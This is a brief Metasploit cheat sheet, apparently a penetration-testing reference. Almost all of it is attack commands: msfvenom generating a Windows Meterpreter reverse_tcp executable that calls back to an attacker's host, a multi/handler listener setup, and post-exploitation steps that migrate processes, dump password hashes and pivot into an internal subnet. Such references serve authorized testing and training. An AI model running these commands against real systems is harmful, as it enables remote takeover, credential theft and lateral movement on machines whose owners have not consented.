MetasploitExploit framework with Meterpreter sessions
---- Common -----
[Launch console] — msfconsole
[Multi-handler] — use exploit/multi/handler
[Search module] — search type:exploit <keyword>
---- Payloads -----
[Generate payload] — msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o payload.exe
[Set options] — set LHOST <IP>; set LPORT 4444; set PAYLOAD windows/x64/meterpreter/reverse_tcp
[Run (background)] — exploit -j
---- Meterpreter -----
[System info] — sysinfo
[Migrate process] — migrate <PID>
[Dump hashes] — hashdump
[Pivot / route] — run autoroute -s 10.0.0.0/24
